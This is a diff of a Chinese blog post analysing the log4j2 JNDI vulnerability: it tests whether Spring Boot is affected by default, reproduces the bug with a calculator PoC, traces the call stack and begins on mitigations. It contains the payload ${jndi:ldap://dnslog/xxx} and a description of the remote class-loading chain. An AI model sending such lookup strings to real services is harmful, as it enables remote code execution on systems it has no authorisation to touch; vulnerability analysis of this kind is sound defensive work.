@@ -20,41 +20,38 @@
     var CONFIG = {"hostname":"yoursite.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
   </script>
 
-  <meta name="description" content="写在前面log4j2核弹级漏洞最近被公开了，log4j2作为log4j的替代者，有着非常广泛的使用，因为几乎没有条件的限制漏洞公开带来的影响极大，许许多多技术员也是因此一夜无眠。 影响求证在漏洞公开的伊始，许多通告都提到只要存在log4j-api、log4j-core就会被影响，看了下spring boot默认会引入spring boot logging而其中包含log4j的依赖包，那spring">
+  <meta name="description" content="写在前面log4j2 核弹级漏洞最近被公开了。log4j2 作为 log4j 的替代者，有着非常广泛的使用。因为几乎没有利用条件的限制，漏洞公开带来的影响极大。甚至于将无线耳机的名字改成漏洞利用代码都能在意想不到的服务中触发漏洞，许许多多技术员也是因此一夜无眠。 影响求证在漏洞公开的伊始，许多漏洞通告都提到只要存在 log4j-api、log4j-core 依赖就会被影响。 如果我们新建一个 Sp">
 <meta property="og:type" content="article">
 <meta property="og:title" content="log4j2漏洞简单小计_ZCY投稿版">
 <meta property="og:url" content="http://yoursite.com/2021/12/15/log4j2%E6%BC%8F%E6%B4%9E%E7%AE%80%E5%8D%95%E5%B0%8F%E8%AE%A1-ZCY%E6%8A%95%E7%A8%BF%E7%89%88/index.html">
 <meta property="og:site_name" content="自动笔记生成器">
-<meta property="og:description" content="写在前面log4j2核弹级漏洞最近被公开了，log4j2作为log4j的替代者，有着非常广泛的使用，因为几乎没有条件的限制漏洞公开带来的影响极大，许许多多技术员也是因此一夜无眠。 影响求证在漏洞公开的伊始，许多通告都提到只要存在log4j-api、log4j-core就会被影响，看了下spring boot默认会引入spring boot logging而其中包含log4j的依赖包，那spring">
+<meta property="og:description" content="写在前面log4j2 核弹级漏洞最近被公开了。log4j2 作为 log4j 的替代者，有着非常广泛的使用。因为几乎没有利用条件的限制，漏洞公开带来的影响极大。甚至于将无线耳机的名字改成漏洞利用代码都能在意想不到的服务中触发漏洞，许许多多技术员也是因此一夜无眠。 影响求证在漏洞公开的伊始，许多漏洞通告都提到只要存在 log4j-api、log4j-core 依赖就会被影响。 如果我们新建一个 Sp">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://yoursite.com/images/211215/Image%20.png">
-<meta property="og:image" content="http://yoursite.com/images/211215/Image%20%5B1%5D.png">
-<meta property="og:image" content="http://yoursite.com/images/211215/Image%20%5B2%5D.png">
-<meta property="og:image" content="http://yoursite.com/images/211215/Image%20%5B3%5D.png">
-<meta property="og:image" content="http://yoursite.com/images/211215/Image%20%5B4%5D.png">
-<meta property="og:image" content="http://yoursite.com/images/211215/Image%20%5B5%5D.png">
-<meta property="og:image" content="http://yoursite.com/images/211215/Image%20%5B6%5D.png">
-<meta property="og:image" content="http://yoursite.com/images/211215/Image%20%5B7%5D.png">
-<meta property="og:image" content="http://yoursite.com/images/211215/Image%20%5B8%5D.png">
-<meta property="og:image" content="http://yoursite.com/images/211215/Image%20%5B9%5D.png">
-<meta property="og:image" content="http://yoursite.com/images/211215/Image%20%5B10%5D.png">
-<meta property="og:image" content="http://yoursite.com/images/211215/Image%20%5B11%5D.png">
-<meta property="og:image" content="http://yoursite.com/images/211215/Image%20%5B12%5D.png">
-<meta property="og:image" content="http://yoursite.com/images/211215/Image%20%5B13%5D.png">
-<meta property="og:image" content="http://yoursite.com/images/211215/Image%20%5B14%5D.png">
-<meta property="og:image" content="http://yoursite.com/images/211215/Image%20%5B15%5D.png">
-<meta property="og:image" content="http://yoursite.com/images/211215/Image%20%5B16%5D.png">
-<meta property="og:image" content="http://yoursite.com/images/211215/Image%20%5B17%5D.png">
-<meta property="og:image" content="http://yoursite.com/images/211215/Image%20%5B18%5D.png">
-<meta property="og:image" content="http://yoursite.com/images/211215/Image%20%5B19%5D.png">
-<meta property="og:image" content="http://yoursite.com/images/211215/Image%20%5B20%5D.png">
-<meta property="og:image" content="http://yoursite.com/images/211215/Image%20%5B21%5D.png">
-<meta property="og:image" content="http://yoursite.com/images/211215/Image%20%5B22%5D.png">
+<meta property="og:image" content="http://yoursite.com/images/211210/Image%20.png">
+<meta property="og:image" content="http://yoursite.com/images/211210/Image%20%5B1%5D.png">
+<meta property="og:image" content="http://yoursite.com/images/211210/Image%20%5B2%5D.png">
+<meta property="og:image" content="http://yoursite.com/images/211210/Image%20%5B3%5D.png">
+<meta property="og:image" content="http://yoursite.com/images/211210/Image%20%5B6%5D.png">
+<meta property="og:image" content="http://yoursite.com/images/211210/Image%20%5B7%5D.png">
+<meta property="og:image" content="http://yoursite.com/images/211210/Image%20%5B8%5D.png">
+<meta property="og:image" content="http://yoursite.com/images/211210/Image%20%5B9%5D.png">
+<meta property="og:image" content="http://yoursite.com/images/211210/Image%20%5B10%5D.png">
+<meta property="og:image" content="http://yoursite.com/images/211210/Image%20%5B11%5D.png">
+<meta property="og:image" content="http://yoursite.com/images/211210/Image%20%5B12%5D.png">
+<meta property="og:image" content="http://yoursite.com/images/211210/Image%20%5B13%5D.png">
+<meta property="og:image" content="http://yoursite.com/images/211210/Image%20%5B14%5D.png">
+<meta property="og:image" content="http://yoursite.com/images/211210/Image%20%5B15%5D.png">
+<meta property="og:image" content="http://yoursite.com/images/211210/Image%20%5B17%5D.png">
+<meta property="og:image" content="http://yoursite.com/images/211210/Image%20%5B18%5D.png">
+<meta property="og:image" content="http://yoursite.com/images/211210/Image%20%5B19%5D.png">
+<meta property="og:image" content="http://yoursite.com/images/211210/Image%20%5B20%5D.png">
+<meta property="og:image" content="http://yoursite.com/images/211210/Image%20%5B21%5D.png">
+<meta property="og:image" content="http://yoursite.com/images/211210/Image%20%5B22%5D.png">
 <meta property="article:published_time" content="2021-12-15T08:11:04.000Z">
-<meta property="article:modified_time" content="2021-12-15T08:17:03.191Z">
+<meta property="article:modified_time" content="2021-12-17T09:18:38.576Z">
 <meta property="article:author" content="0xSky">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://yoursite.com/images/211215/Image%20.png">
+<meta name="twitter:image" content="http://yoursite.com/images/211210/Image%20.png">
 
 <link rel="canonical" href="http://yoursite.com/2021/12/15/log4j2%E6%BC%8F%E6%B4%9E%E7%AE%80%E5%8D%95%E5%B0%8F%E8%AE%A1-ZCY%E6%8A%95%E7%A8%BF%E7%89%88/">
 
@@ -196,10 +193,16 @@
                 <i class="fa fa-calendar-o"></i>
               </span>
               <span class="post-meta-item-text">发表于</span>
-              
 
-              <time title="创建时间：2021-12-15 16:11:04 / 修改时间：16:17:03" itemprop="dateCreated datePublished" datetime="2021-12-15T16:11:04+08:00">2021-12-15</time>
+              <time title="创建时间：2021-12-15 16:11:04" itemprop="dateCreated datePublished" datetime="2021-12-15T16:11:04+08:00">2021-12-15</time>
             </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-12-17 17:18:38" itemprop="dateModified" datetime="2021-12-17T17:18:38+08:00">2021-12-17</time>
+              </span>
 
           
 
@@ -212,60 +215,79 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <h4 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h4><p>log4j2核弹级漏洞最近被公开了，log4j2作为log4j的替代者，有着非常广泛的使用，因为几乎没有条件的限制漏洞公开带来的影响极大，许许多多技术员也是因此一夜无眠。</p>
-<h4 id="影响求证"><a href="#影响求证" class="headerlink" title="影响求证"></a>影响求证</h4><p>在漏洞公开的伊始，许多通告都提到只要存在log4j-api、log4j-core就会被影响，看了下spring boot默认会引入spring boot logging而其中包含log4j的依赖包，那spring不是默认受影响？但是spring boot实际上默认使用logback进行日志实现，slf4j进行抽象层管理，所以只看依赖判断是否受影响有些不严谨，许多通告方都没有仔细求证，这里用测试项目来试一下。</p>
-<p>写一个会将输入写入日志的接口。</p>
-<p><img src="/images/211215/Image%20.png" alt=""></p>
-<p><img src="/images/211215/Image%20%5B1%5D.png" alt=""></p>
+        <h4 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h4><p>log4j2 核弹级漏洞最近被公开了。log4j2 作为 log4j 的替代者，有着非常广泛的使用。因为几乎没有利用条件的限制，漏洞公开带来的影响极大。甚至于将无线耳机的名字改成漏洞利用代码都能在意想不到的服务中触发漏洞，许许多多技术员也是因此一夜无眠。</p>
+<h4 id="影响求证"><a href="#影响求证" class="headerlink" title="影响求证"></a>影响求证</h4><p>在漏洞公开的伊始，许多漏洞通告都提到只要存在 log4j-api、log4j-core 依赖就会被影响。</p>
+<p>如果我们新建一个 Spring Boot 项目，在引入 spring-boot-starter 依赖时默认会引入 spring-boot-starter-logging，而其中包含 log4j 的依赖包，那 Spring Boot 不是默认受影响？非也， Spring Boot 实际上默认使用 logback 进行日志实现，slf4j 进行抽象层管理，所以，默认情况下并不受影响。</p>
+<p>只看依赖判断是否受影响的做法是有些不严谨的，许多通告方都没有仔细求证，为了验证，我用测试项目来试一下。</p>
+<p>写一个会将输入写入日志的接口：</p>
+<p><img src="/images/211210/Image%20.png" alt=""></p>
+<p><img src="/images/211210/Image%20%5B1%5D.png" alt=""></p>
 <p>访问一下，日志写入。</p>
-<p><img src="/images/211215/Image%20%5B2%5D.png" alt=""></p>
-<p>接下来下断点看是什么日志组件进行了处理，可以看到是logback对日志进行了处理。</p>
-<p><img src="/images/211215/Image%20%5B3%5D.png" alt=""></p>
-<p>所以网上引入依赖就算被影响的叙述实际上是不准确、不严谨的，虽然这有助于引起注意但是也对排查造成了干扰，并不可取。log4j和logback会被spring boot logging组件默认引入，但spring默认会使用logback，所以spring boot默认引入了log4j但并不受影响。<br>作为技术从业者应该谨记不要听风就是雨。对于漏洞应小心求证，细心排查，严谨处理。<br>当然这个漏洞的邮箱还是非常巨大的，因为有许多的组件都用到了它，例如es、Struts2、Solr等等众多组件与服务。<br>再补上一个受影响的log4j进行日志记录，手动使用log4j处理日志，这样就由log4j进行日志处理了。</p>
-<p><img src="/images/211215/Image%20%5B4%5D.png" alt=""></p>
-<p><img src="/images/211215/Image%20%5B5%5D.png" alt=""></p>
-<h4 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h4><p>网络上流传最广的是使用JNDI进行LDAP DNS查询来确定是否受漏洞影响的exp（${jndi:ldap://dnslog/xxx}），根据这个exp我们可以简单判定是因为JNDI LDAP查询远程class并进行加载造成的攻击。这个漏洞实际上是官方支持的一种功能，官方支持在日志设置时使用${xxx}进行动态设置（<a href="https://logging.apache.org/log4j/2.x/manual/lookups.html" target="_blank" rel="noopener">官网描述</a>），并且支持日志输出时使用如log.info(“${sys:java.version})动态获取并输出一些内容，而后面这个功能也支持JNDI协议，所以暴露在了JDNI注入攻击（JDNI远程类加载攻击）之中。</p>
-<p>这里简单介绍一下这种攻击，JNDI全称为Java Naming and Directory Interface，是一种类似于索引中心的API功能，可以用于实现动态配置的功能。当代码中jndiName变量可控时，发起查询的客户端就会从服务端加载远程class文件，最终导致命令执行。<br>在上述的POC中使用的是JNDI LDAP注入攻击，其攻击过程为：攻击者发送恶意JNDI  LDAP查询——被攻击服务接受并发起查询——从攻击者部署的JDNI上下载class——本地加载class——触发class中预置的恶意代码<br>Java官方对这个问题进行过修复，在Java 1.8_191起默认不信任远程codebase，即远程class文件不会被自动加载，所以在Java 1.8_191及以后只能从本地class文件加载。<br>更多的详情在<a href="https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf" target="_blank" rel="noopener">blackhat议题</a>中有更加详细的描述。</p>
-<h4 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><p>只是简单复现问题的话可以使用低版本java环境来测试，这里我使用过低于Java 1.8_191的版本测试。</p>
-<p>最初使用JNDI-Injection-Exploit与marshalsec（这两款测试工具都有LDAP服务功能，可以在全球最大同性交友平台找到）生成弹出POC测试没有成功，简单跟了下代码断点发现我直接使用springboot后只引入了log4j-api组件，实际日志在slf4j处理后被logback实际输出了，并没有使用log4j。这里也侧面说明了有log4j-api就被影响的说法也是不准确的，必须要有log4j-core依赖因为触发漏洞的代码实际在这个组件包中，在排查受影响服务时也应该以log4j-core依赖为准，下文中会有体现。<br>继续测试，先排除原有的spring-boot-starter-logging依赖，测试项目是在spring-boot-starter-web组件的spring-boot-starter依赖组件中引入了logging，所以要此组件引入处的pom配置处排除spring-boot-starter-logging。<br>之后直接按照IDE的提示引入log4j-api，这时进行测试会报错，提示我们需要引入log4j-core。</p>
-<p><img src="/images/211215/Image%20%5B6%5D.png" alt=""></p>
-<p>引入包后再执行日志记录动作，触发了ldap查询动作，弹出计算器。</p>
-<p><img src="/images/211215/Image%20%5B7%5D.png" alt=""></p>
-<p><img src="/images/211215/Image%20%5B8%5D.png" alt=""></p>
-<p><img src="/images/211215/Image%20%5B9%5D.png" alt=""></p>
+<p><img src="/images/211210/Image%20%5B2%5D.png" alt=""></p>
+<p>接下来下断点看是什么日志组件进行了处理，跟踪断点，可以看到是 logback 对日志进行了处理：</p>
+<p><img src="/images/211210/Image%20%5B3%5D.png" alt=""></p>
+<p>log4j 和 logback 都会被 spring-boot-starter-logging 组件默认引入，但 Spring Boot 默认会使用 logback 进行日志的实际输出。所以，虽然 Spring Boot 默认引入了 log4j 但并不受影响。</p>
+<p>因此，网上部分文章说的引入依赖就算被影响实际上是不准确、不严谨的。虽然这样写可以吸引眼球，引起重视，但是也对漏洞影响排查造成了干扰，并不可取。</p>
+<p>作为技术从业者，我们不要听风就是雨，对于漏洞应小心求证，细心排查，严谨处理。当然这个漏洞的影响还是极其巨大的，作为一种软件的”基础设施“，有许多的组件都使用了它作为日志实现，例如 es、Struts2、Solr 等等众多组件与服务。</p>
+<p>再补上一个受影响的 log4j 进行日志记录，手动使用 log4j 处理日志，这样就由 log4j 进行日志处理了：</p>
+<p>![](/images/211210/Image [4].png)</p>
+<p>![](/images/211210/Image [5].png)</p>
+<h4 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h4><p>网络上流传最广的是使用 JNDI 进行 LDAP DNS 查询来确定是否受漏洞影响的 PoC（${jndi:ldap://dnslog/xxx}），根据这个 PoC 我们可以简单判定是因为 JNDI LDAP 查询远程 class 并进行加载造成了攻击。</p>
+<p>这个漏洞实际上是官方支持的一种功能，官方支持在日志设置时使用 ${xxx} 进行动态设置（<a href="https://logging.apache.org/log4j/2.x/manual/lookups.html" target="_blank" rel="noopener">官网描述</a>），并且支持日志输出时使用如 log.info(“${sys:java.version}) 动态获取并输出一些内容。而后面这个功能也支持 JNDI 协议，所以暴露在了 JNDI 注入攻击（JNDI 远程类加载攻击）之中。</p>
+<p>这里简单介绍一下这种攻击，JNDI 全称为 Java Naming and Directory Interface，是一种类似于索引中心的API功能，可以用于实现动态配置的功能。当代码中 jndiName 变量可控时，发起查询的客户端就会从服务端加载远程 class 文件，最终导致命令执行。</p>
+<p>JNDI LDAP 注入攻击的过程简单来说就是：攻击者发送恶意 JNDI  LDAP 查询——被攻击服务接受并发起查询——从恶意 JNDI 服务上下载 class ——本地加载 class ——触发 class 中预置的恶意代码。</p>
+<p>JAVA 官方对这个问题进行过修复，从 JAVA 1.8_191 起默认不信任远程 codebase，即远程 class 文件不会被自动加载，所以在 JAVA 1.8_191 及以后只能从本地 class 文件加载。<br>更多的详情在<a href="https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf" target="_blank" rel="noopener">blackhat议题</a>中有更加详细的描述。</p>
+<h4 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><p>为了方便测试复现漏洞可以使用低版本 JAVA 环境来测试，这里我使用过低于 JAVA 1.8_191 的版本测试。</p>
+<p>最初使用 JNDI-Injection-Exploit 与 marshalsec（这两款测试工具都有 LDAP 服务功能，可以在 GItHub 找到）生成弹出计算器 PoC 进行测试时没有成功。简单跟踪代码断点后，我发现如果直接使用 logger 对象后只引入了 log4j-api 组件，实际日志在 slf4j 处理后实际上被 logback 输出了，并没有使用 log4j 进行输出。</p>
+<p>这里也侧面说明了项目中有 log4j-api 依赖就被漏洞影响的说法也是不准确的，必须要有 log4j-core 依赖，因为触发漏洞的代码实际在这个组件包中，在排查受影响服务时也应该以 log4j-core 依赖为准，下文中会有体现。</p>
+<p>继续测试，先排除原有的 spring-boot-starter-logging 依赖，测试项目是在 spring-boot-starter-web 组件的 spring-boot-starter 依赖组件中引入了 spring-boot-starter-logging ，所以要此组件引入处的 pom 配置处排除 spring-boot-starter-logging。</p>
+<p>之后直接按照 IDE 的提示引入 log4j-api，这时进行测试会报错，提示我们需要引入 log4j-core。</p>
+<p><img src="/images/211210/Image%20%5B6%5D.png" alt=""></p>
+<p>引入 log4j-core 依赖后再执行日志记录动作，触发了 LDAP 查询动作，弹出计算器。</p>
+<p><img src="/images/211210/Image%20%5B7%5D.png" alt=""></p>
+<p><img src="/images/211210/Image%20%5B8%5D.png" alt=""></p>
+<p><img src="/images/211210/Image%20%5B9%5D.png" alt=""></p>
 <h4 id="具体分析"><a href="#具体分析" class="headerlink" title="具体分析"></a>具体分析</h4><p>按照惯例先贴一下调用栈</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">c_lookup:<span class="number">1017</span>, LdapCtx (com.sun.jndi.ldap)</span><br><span class="line">p_lookup:<span class="number">542</span>, ComponentContext (com.sun.jndi.toolkit.ctx)</span><br><span class="line">lookup:<span class="number">177</span>, PartialCompositeContext (com.sun.jndi.toolkit.ctx)</span><br><span class="line">lookup:<span class="number">205</span>, GenericURLContext (com.sun.jndi.toolkit.url)</span><br><span class="line">lookup:<span class="number">94</span>, ldapURLContext (com.sun.jndi.url.ldap)</span><br><span class="line">lookup:<span class="number">417</span>, InitialContext (javax.naming)</span><br><span class="line">lookup:<span class="number">172</span>, JndiManager (org.apache.logging.log4j.core.net)</span><br><span class="line">lookup:<span class="number">56</span>, JndiLookup (org.apache.logging.log4j.core.lookup)</span><br><span class="line">lookup:<span class="number">223</span>, Interpolator (org.apache.logging.log4j.core.lookup)</span><br><span class="line">resolveVariable:<span class="number">1116</span>, StrSubstitutor (org.apache.logging.log4j.core.lookup)</span><br><span class="line">substitute:<span class="number">1038</span>, StrSubstitutor (org.apache.logging.log4j.core.lookup)</span><br><span class="line">substitute:<span class="number">912</span>, StrSubstitutor (org.apache.logging.log4j.core.lookup)</span><br><span class="line">replace:<span class="number">467</span>, StrSubstitutor (org.apache.logging.log4j.core.lookup)</span><br><span class="line">format:<span class="number">132</span>, MessagePatternConverter (org.apache.logging.log4j.core.pattern)</span><br><span class="line">format:<span class="number">38</span>, PatternFormatter (org.apache.logging.log4j.core.pattern)</span><br><span class="line">toSerializable:<span class="number">345</span>, PatternLayout$PatternSerializer (org.apache.logging.log4j.core.layout)</span><br><span class="line">toText:<span class="number">244</span>, PatternLayout (org.apache.logging.log4j.core.layout)</span><br><span class="line">encode:<span class="number">229</span>, PatternLayout (org.apache.logging.log4j.core.layout)</span><br><span class="line">encode:<span class="number">59</span>, PatternLayout (org.apache.logging.log4j.core.layout)</span><br><span class="line">directEncodeEvent:<span class="number">197</span>, AbstractOutputStreamAppender (org.apache.logging.log4j.core.appender)</span><br><span class="line">tryAppend:<span class="number">190</span>, AbstractOutputStreamAppender (org.apache.logging.log4j.core.appender)</span><br><span class="line">append:<span class="number">181</span>, AbstractOutputStreamAppender (org.apache.logging.log4j.core.appender)</span><br><span class="line">tryCallAppender:<span class="number">156</span>, AppenderControl (org.apache.logging.log4j.core.config)</span><br><span class="line">callAppender0:<span class="number">129</span>, AppenderControl (org.apache.logging.log4j.core.config)</span><br><span class="line">callAppenderPreventRecursion:<span class="number">120</span>, AppenderControl (org.apache.logging.log4j.core.config)</span><br><span class="line">callAppender:<span class="number">84</span>, AppenderControl (org.apache.logging.log4j.core.config)</span><br><span class="line">callAppenders:<span class="number">543</span>, LoggerConfig (org.apache.logging.log4j.core.config)</span><br><span class="line">processLogEvent:<span class="number">502</span>, LoggerConfig (org.apache.logging.log4j.core.config)</span><br><span class="line">log:<span class="number">485</span>, LoggerConfig (org.apache.logging.log4j.core.config)</span><br><span class="line">log:<span class="number">460</span>, LoggerConfig (org.apache.logging.log4j.core.config)</span><br><span class="line">log:<span class="number">82</span>, AwaitCompletionReliabilityStrategy (org.apache.logging.log4j.core.config)</span><br><span class="line">log:<span class="number">161</span>, Logger (org.apache.logging.log4j.core)</span><br><span class="line">tryLogMessage:<span class="number">2198</span>, AbstractLogger (org.apache.logging.log4j.spi)</span><br><span class="line">logMessageTrackRecursion:<span class="number">2152</span>, AbstractLogger (org.apache.logging.log4j.spi)</span><br><span class="line">logMessageSafely:<span class="number">2135</span>, AbstractLogger (org.apache.logging.log4j.spi)</span><br><span class="line">logMessage:<span class="number">2011</span>, AbstractLogger (org.apache.logging.log4j.spi)</span><br><span class="line">logIfEnabled:<span class="number">1983</span>, AbstractLogger (org.apache.logging.log4j.spi)</span><br><span class="line">error:<span class="number">740</span>, AbstractLogger (org.apache.logging.log4j.spi)</span><br><span class="line">logTest:<span class="number">13</span>, LogTest (com.examplespring.demo.controller)</span><br><span class="line">LogTest:<span class="number">14</span>, TestController (com.examplespring.demo.controller)</span><br></pre></td></tr></table></figure>
 
-<p>在调用栈里我们可以看到关键的几个动作：<br>lookup:172, JndiManager (<a href="http://org.apache.logging.log4j.core.net/" target="_blank" rel="noopener">org.apache.logging.log4j.core.net</a>)<br>lookup:56, JndiLookup (org.apache.logging.log4j.core.lookup)<br>lookup:223, Interpolator (org.apache.logging.log4j.core.lookup)<br>resolveVariable:1116, StrSubstitutor (org.apache.logging.log4j.core.lookup)<br>substitute:1038, StrSubstitutor (org.apache.logging.log4j.core.lookup)<br>substitute:912, StrSubstitutor (org.apache.logging.log4j.core.lookup)<br>replace:467, StrSubstitutor (org.apache.logging.log4j.core.lookup)<br>format:132, MessagePatternConverter (org.apache.logging.log4j.core.pattern)<br>format:38, PatternFormatter (org.apache.logging.log4j.core.pattern)<br>这几个动作都在log4j-core组件包中，也印证了前面说的有log4j-api就有问题是不准确的，实际上修复漏洞首要需要关注log4j-core包。</p>
-<p>从toText这个函数开始跟进，这里开始转化event内容进行输出。</p>
-<p><img src="/images/211215/Image%20%5B10%5D.png" alt=""></p>
-<p> toSerializable函数遍历使用PatternFormatter对event进行格式化。</p>
-<p><img src="/images/211215/Image%20%5B11%5D.png" alt=""></p>
-<p>在第15个PatternFormatter——MessagePatternConverter进行操作时，event中如果有${就会进行替换。</p>
-<p><img src="/images/211215/Image%20%5B12%5D.png" alt=""></p>
-<p>这里打个岔，可以看到进入替换逻辑有noLookups为false的前提，所以这里就有了临时修复方案——将这个变量设置为true，而这个变量就是<em>FORMAT_MESSAGES_PATTERN_DISABLE_LOOKUPS</em>常量，来源于从配置中查找log4j2.formatMsgNoLookups的值，如果不配置则其默认值为false。</p>
-<p><img src="/images/211215/Image%20%5B13%5D.png" alt=""></p>
-<p><img src="/images/211215/Image%20%5B14%5D.png" alt=""></p>
-<p>言归正传，后续调用substitute递归解析文本中的变量值，注释中也有说明。</p>
-<p><img src="/images/211215/Image%20%5B15%5D.png" alt=""></p>
-<p>resolveVariable进行具体的变量解析，后续就是lookup调用，最终调用java的lookup，所以也受java环境限制。</p>
-<p><img src="/images/211215/Image%20%5B16%5D.png" alt=""></p>
-<p><img src="/images/211215/Image%20%5B17%5D.png" alt=""></p>
-<p>上述的操作在java1.8_191前因为默认信任外部codebase是可以进行的，在java1.8_191后不再信任外部codebase所以使用外部类不再可行，许多的通告中都提到了这一点。但是本地存在的类还是可以利用的，而spring boot 默认带有tomcat-embed依赖（实际是依赖EL表达式包）可以通过这种类似的本地类执行代码，还是比较容易利用的，可以参考<a href="https://www.veracode.com/blog/research/exploiting-jndi-injections-java" target="_blank" rel="noopener">Exploiting JNDI Injections in Java</a>和<a href="https://skysliently.github.io/2021/03/23/dubbo%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88CVE-2020-1948%EF%BC%89%E5%8F%AF%E7%94%A8%E9%93%BE%E8%B7%AF%E5%AD%A6%E4%B9%A0/" target="_blank" rel="noopener">dubbo反序列化（CVE-2020-1948）可用链路学习</a>一文。</p>
+<p>在调用栈里我们可以看到关键的几个动作：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">lookup:<span class="number">172</span>, JndiManager (org.apache.logging.log4j.core.net)</span><br><span class="line">lookup:<span class="number">56</span>, JndiLookup (org.apache.logging.log4j.core.lookup)</span><br><span class="line">lookup:<span class="number">223</span>, Interpolator (org.apache.logging.log4j.core.lookup)</span><br><span class="line">resolveVariable:<span class="number">1116</span>, StrSubstitutor (org.apache.logging.log4j.core.lookup)</span><br><span class="line">substitute:<span class="number">1038</span>, StrSubstitutor (org.apache.logging.log4j.core.lookup)</span><br><span class="line">substitute:<span class="number">912</span>, StrSubstitutor (org.apache.logging.log4j.core.lookup)</span><br><span class="line">replace:<span class="number">467</span>, StrSubstitutor (org.apache.logging.log4j.core.lookup)</span><br><span class="line">format:<span class="number">132</span>, MessagePatternConverter (org.apache.logging.log4j.core.pattern)</span><br><span class="line">format:<span class="number">38</span>, PatternFormatter (org.apache.logging.log4j.core.pattern)</span><br></pre></td></tr></table></figure>
+
+<p>这几个漏洞触发的关键动作都在 log4j-core 依赖中，也印证了前面说的有 log4j-api 依赖就有问题是不准确的，实际上修复漏洞首先需要关注 log4j-core 依赖。</p>
+<p>从 toText 这个函数开始跟进，这里开始转化 event 内容进行输出。</p>
+<p><img src="/images/211210/Image%20%5B10%5D.png" alt=""></p>
+<p> toSerializable 函数遍历使用 PatternFormatter 对 event 进行格式化。</p>
+<p><img src="/images/211210/Image%20%5B11%5D.png" alt=""></p>
+<p>在第15个 PatternFormatter —— MessagePatternConverter 进行操作时，event 中如果有 ${ 就会进行替换。</p>
+<p><img src="/images/211210/Image%20%5B12%5D.png" alt=""></p>
+<p>这里打个岔，可以看到进入替换逻辑有 noLookups 为 false 的前提，所以这里就有了临时修复方案——将这个变量设置为 true，而这个变量就是 <em>FORMAT_MESSAGES_PATTERN_DISABLE_LOOKUPS</em> 常量，来源于从配置中查找 log4j2.formatMsgNoLookups 的值，如果不配置则其默认值为 false。</p>
+<p><img src="/images/211210/Image%20%5B13%5D.png" alt=""></p>
+<p><img src="/images/211210/Image%20%5B14%5D.png" alt=""></p>
+<p>言归正传，后续调用 substitute 递归解析文本中的变量值，注释中也有说明。</p>
+<p><img src="/images/211210/Image%20%5B15%5D.png" alt=""></p>
+<p>resolveVariable 进行具体的变量解析，后续就是 lookup 调用，在这里 jndiName 已经被输入完全控制。最终调用了 JAVA 的 lookup，所以也受 JAVA 环境限制。</p>
+<p>![](/images/211210/Image [16].png)</p>
+<p><img src="/images/211210/Image%20%5B17%5D.png" alt=""></p>
+<p>上述的操作在 JAVA 1.8_191 前因为默认信任外部 codebase 是可以进行的，在 JAVA 1.8_191 后不再信任外部 codebase 所以使用外部类不再可行，许多的通告中都提到了这一点。但是本地存在的类还是可以利用的，而 Spring Boot 默认带有 tomcat 依赖，可以通过这种类似的本地类执行代码，还是比较容易利用的，可以参考<a href="https://www.veracode.com/blog/research/exploiting-jndi-injections-java" target="_blank" rel="noopener">Exploiting JNDI Injections in Java</a>和[dubbo反序列化（CVE-2020-1948）可用链路学习中的利用。</p>
 <h4 id="临时措施"><a href="#临时措施" class="headerlink" title="临时措施"></a>临时措施</h4><p>根据前文内容我们可以简单得出一些临时解决方式</p>
